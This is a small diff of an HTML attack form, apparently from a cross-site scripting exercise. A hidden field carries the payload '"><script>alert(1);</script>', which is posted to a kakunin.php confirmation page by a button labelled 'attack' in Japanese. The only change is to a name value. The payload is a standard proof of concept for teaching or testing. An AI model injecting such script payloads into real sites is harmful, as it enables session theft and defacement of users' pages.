@@ -15,7 +15,7 @@
     <div id="contents">
         <main>
             <form method="POST" action="kakunin.php">
-                <input type="hidden" name="name" value="宮丸">
+                <input type="hidden" name="name" value="宮丸2">
                 <input type="hidden" name="count" value='"><script>alert(1);</script>'>
                 <p><input type="submit" value="攻撃する"></p>
             </form>
